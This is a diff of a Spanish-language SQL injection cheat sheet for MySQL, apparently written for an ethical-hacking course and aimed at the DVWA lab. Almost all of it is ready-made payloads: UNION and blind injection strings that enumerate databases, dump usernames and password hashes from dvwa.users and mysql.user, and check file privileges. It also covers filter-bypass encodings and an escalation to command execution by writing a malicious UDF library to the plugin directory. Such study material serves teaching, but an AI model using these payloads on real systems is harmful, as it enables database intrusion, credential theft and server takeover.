@@ -1,5 +1,7 @@
 =====================================================
       SQL INJECTION - PASO A PASO (MySQL)
+      Autor: D1n0 (Alejandro Mamán) | INSO3A
+      Asignatura: Hacking Ético
 =====================================================
 
 === PASO 1: DETECTAR VULNERABILIDAD ===
@@ -14,66 +16,90 @@ Probar:
 
 === PASO 2: CONTAR COLUMNAS ===
 
-' ORDER BY 1 -- -
-' ORDER BY 2 -- -
-' ORDER BY 3 -- -     (subir hasta error)
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -     (subir hasta error)
 
-O con UNION:
-' UNION SELECT NULL -- -
-' UNION SELECT NULL,NULL -- -
-' UNION SELECT NULL,NULL,NULL -- -
+NOTA: ORDER BY 1 SIEMPRE funciona independientemente del numero de columnas,
+por eso no sirve como referencia. El primer error te da el numero real.
+Si ORDER BY da problemas, probar con #:
+1' ORDER BY 1#
+1' ORDER BY 2#
+
+Confirmar con UNION (usar NULL, no numeros - ver nota abajo):
+1' UNION SELECT NULL-- -
+1' UNION SELECT NULL,NULL-- -
+1' UNION SELECT NULL,NULL,NULL-- -
+
+[!] IMPORTANTE: Usar siempre NULL en vez de 1,2,3
+    NULL es compatible con cualquier tipo de columna (string, int, etc.)
+    Un entero como 1 puede dar error de tipos si la columna espera string.
 
 
 === PASO 3: IDENTIFICAR COLUMNAS VISIBLES ===
 
-' UNION SELECT 1,2,3 -- -
-(ver que numeros aparecen en pantalla)
+1' UNION SELECT 'columna1','columna2'-- -
+(ver que etiqueta aparece en cada campo de la respuesta)
 
 
 === PASO 4: INFO BASICA ===
 
-' UNION SELECT 1,database(),user() -- -
-' UNION SELECT 1,version(),@@hostname -- -
+1' UNION SELECT user(),database()-- -
+1' UNION SELECT version(),null-- -
+1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -  (OS y arquitectura 32/64)
+1' UNION SELECT @@plugin_dir,null-- -                               (directorio de plugins MySQL)
 
 
 === PASO 5: LISTAR BASES DE DATOS ===
 
-' UNION SELECT 1,schema_name,3 FROM information_schema.schemata -- -
+1' UNION SELECT schema_name,null FROM information_schema.schemata-- -
 
-O una por una:
-' UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),3 -- -
-' UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 1,1),3 -- -
-' UNION SELECT 1,(SELECT schema_name FROM information_schema.schemata LIMIT 2,1),3 -- -
+[!] ERROR COMUN: el campo se llama schema_name, NO schemata_name
 
 
-=== PASO 6: LISTAR TABLAS DE UNA BD ===
+=== PASO 6: LISTAR TABLAS ===
 
-' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='nombre_bd' -- -
+De una BD concreta:
+1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema='nombre_bd'-- -
 
-O con database() actual:
-' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -
+De todas las BDs a la vez:
+1' UNION SELECT table_schema,table_name FROM information_schema.tables-- -
 
-Todas juntas:
-' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -
+De la BD actual:
+1' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()-- -
 
 
 === PASO 7: LISTAR COLUMNAS DE UNA TABLA ===
 
-' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' -- -
-
-Todas juntas:
-' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users' -- -
+1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -
 
 
 === PASO 8: EXTRAER DATOS ===
 
-' UNION SELECT 1,username,password FROM users -- -
+1' UNION SELECT user,password FROM dvwa.users-- -
+
+Especificar BD.tabla cuando no estas en esa BD:
+1' UNION SELECT user,password FROM mysql.user-- -
 
 Concatenar varios campos:
-' UNION SELECT 1,CONCAT(username,':',password),3 FROM users -- -
+1' UNION SELECT CONCAT(user,':',password),null FROM dvwa.users-- -
 
-Todos los registros en una linea:
-' UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),3 FROM users -- -
+
+=== PASO 9: VERIFICAR PRIVILEGIOS (para escalada) ===
+
+Usuario y BD actuales:
+1' UNION SELECT user(),database()-- -
+
+Privilegio de escritura de ficheros:
+1' UNION SELECT file_priv,null FROM mysql.user WHERE user='root'-- -
+(Y = tiene privilegios, N = no tiene)
+
+Directorio de plugins:
+1' UNION SELECT @@plugin_dir,null-- -
+
+Version y arquitectura del servidor:
+1' UNION SELECT version(),null-- -
+1' UNION SELECT @@version_compile_os,@@version_compile_machine-- -
 
 
 =====================================================
@@ -82,52 +108,52 @@ Todos los registros en una linea:
 
 === PASO 1: CONFIRMAR BLIND ===
 
-1' AND 1=1 -- -    (respuesta normal)
-1' AND 1=2 -- -    (respuesta diferente)
+1' AND 1=1-- -    (respuesta normal)
+1' AND 1=2-- -    (respuesta diferente)
 
 
 === PASO 2: LONGITUD DE DATABASE() ===
 
-1' AND length(database())=1 -- -
-1' AND length(database())=2 -- -
+1' AND length(database())=1-- -
+1' AND length(database())=2-- -
 ...hasta TRUE
 
 
 === PASO 3: EXTRAER DATABASE() CARACTER A CARACTER ===
 
-1' AND substring(database(),1,1)='a' -- -
-1' AND substring(database(),1,1)='b' -- -
+1' AND substring(database(),1,1)='a'-- -
+1' AND substring(database(),1,1)='b'-- -
 ...hasta TRUE, luego posicion 2, 3, etc.
 
 
 === PASO 4: CONTAR BASES DE DATOS ===
 
-1' AND (SELECT count(schema_name) FROM information_schema.schemata)=1 -- -
-1' AND (SELECT count(schema_name) FROM information_schema.schemata)=5 -- -
+1' AND (SELECT count(schema_name) FROM information_schema.schemata)=1-- -
+1' AND (SELECT count(schema_name) FROM information_schema.schemata)=5-- -
 
 
 === PASO 5: LONGITUD NOMBRE BD (posicion X) ===
 
-1' AND (SELECT length(schema_name) FROM information_schema.schemata LIMIT 0,1)=18 -- -
-1' AND (SELECT length(schema_name) FROM information_schema.schemata LIMIT 1,1)=4 -- -
+1' AND (SELECT length(schema_name) FROM information_schema.schemata LIMIT 0,1)=18-- -
+1' AND (SELECT length(schema_name) FROM information_schema.schemata LIMIT 1,1)=4-- -
 
 
 === PASO 6: EXTRAER NOMBRE BD CARACTER A CARACTER ===
 
-1' AND substring((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),1,1)='d' -- -
-1' AND substring((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),2,1)='v' -- -
+1' AND substring((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),1,1)='d'-- -
+1' AND substring((SELECT schema_name FROM information_schema.schemata LIMIT 2,1),2,1)='v'-- -
 
 
 === PASO 7: REPETIR PARA TABLAS ===
 
 Contar tablas:
-1' AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema='dvwa')=2 -- -
+1' AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema='dvwa')=2-- -
 
 Longitud nombre tabla:
-1' AND (SELECT length(table_name) FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1)=5 -- -
+1' AND (SELECT length(table_name) FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1)=5-- -
 
 Extraer nombre:
-1' AND substring((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1)='u' -- -
+1' AND substring((SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa' LIMIT 0,1),1,1)='u'-- -
 
 
 === PASO 8: REPETIR PARA COLUMNAS Y DATOS ===
@@ -141,7 +167,7 @@ Extraer nombre:
 
 Sustituir espacios por:
 
-%09  = Tab
+%09  = Tab (el mas fiable)
 %0a  = Newline (salto de linea)
 %0b  = Tab vertical
 %0c  = Form feed
@@ -198,5 +224,29 @@ FLUJO COMPLETO SIN COMENTARIOS:
 7. Extraer datos:
 ?name=x'%09UNION%09SELECT%091,name,passwd,4,'5'%09FROM%09users%09WHERE%09'1'='1
 
+
+=====================================================
+         ESCALADA A RCE VIA UDF (MySQL)
+=====================================================
+
+Requisitos:
+- Usuario MySQL con privilegios root
+- file_priv = Y  (verificar con paso 9 arriba)
+- Conocer @@plugin_dir
+- Arquitectura del servidor (32/64 bits via @@version_compile_machine)
+
+Flujo:
+1. Verificar privilegios y arquitectura (ver PASO 9)
+2. Buscar libreria UDF maliciosa en Kali:
+   find / -name "lib_mysqludf_sys*" 2>/dev/null
+3. Seleccionar la correcta segun arquitectura (32/64 bits)
+4. Escribir la libreria .so en @@plugin_dir via INTO DUMPFILE
+5. Registrar la funcion: CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'
+6. Ejecutar comandos: SELECT sys_exec('id')
+
+Tablas de mysql relevantes para UDF:
+- mysql.user     -> usuarios y privilegios
+- mysql.func     -> funciones UDF registradas
+- mysql.plugin   -> plugins cargados
 
 =====================================================
